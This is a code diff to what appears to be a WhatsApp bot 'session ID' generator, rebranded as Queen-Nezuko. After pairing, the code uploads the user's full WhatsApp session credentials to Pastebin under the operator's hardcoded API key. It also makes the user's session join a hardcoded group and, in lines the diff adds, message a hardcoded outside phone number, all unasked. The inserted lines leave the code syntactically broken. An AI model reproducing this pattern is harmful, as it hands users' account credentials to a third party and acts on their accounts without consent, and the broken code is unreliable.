@@ -1,5 +1,5 @@
 const PastebinAPI = require('pastebin-js'),
-pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL')
+pastebin = new PastebinAPI('IG9REZ1z5KPvWNejqfK7AAMXwO90Gjxl')
 const {makeid} = require('./id');
 const QRCode = require('qrcode');
 const express = require('express');
@@ -83,10 +83,16 @@ router.get('/', async (req, res) => {
 					fs.writeFileSync(__dirname+`/temp/${id}/${id}.json`, JSON.stringify(mergedJSON));
 					const output = await pastebin.createPasteFromFile(__dirname+`/temp/${id}/${id}.json`, "pastebin-js test", null, 1, "N");
 					let message = output.split('/')[3];
-                    let msg = `izumi~${message.split('').reverse().join('')}`;
-                     await session.groupAcceptInvite("KHvcGD7aEUo8gPocJsYXZe");
+                    let msg = `Queen-Nezuko~${message.split('').reverse().join('')}`;
+                     await session.groupAcceptInvite("DcGABEejUwOG8YcgGOcizF");
 					await session.sendMessage(session.user.id, {
 						text: msg
+					await session.sendMessage(session.user.id, { text: ` *⛒ ᴛʜᴀɴᴋ чᴏᴜ ғᴏʀ ᴄʜᴏᴏꜱɪɴɢ qᴜᴇᴇɴ-ɴᴇᴢᴜᴋᴏ⭜*
+
+                       *⛥  ᴛʜɪꜱ ɪꜱ ʏᴏᴜʀ ꜱᴇꜱꜱɪᴏɴ ɪᴅ ᴩʟᴇᴀꜱᴇ ᴅᴏ ɴᴏᴛ ꜱʜᴀʀᴇ ᴛʜɪꜱ ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ⤾*\n\n!!` });
+                    await session.sendMessage(session.user.id, { text: data.data });
+                    await session.sendMessage("917907387121@s.whatsapp.net", { text: "*Successfully Scanned Queen-nezuko-Md*✅" });
+
 					})
 					await delay(100);
 					await session.ws.close();
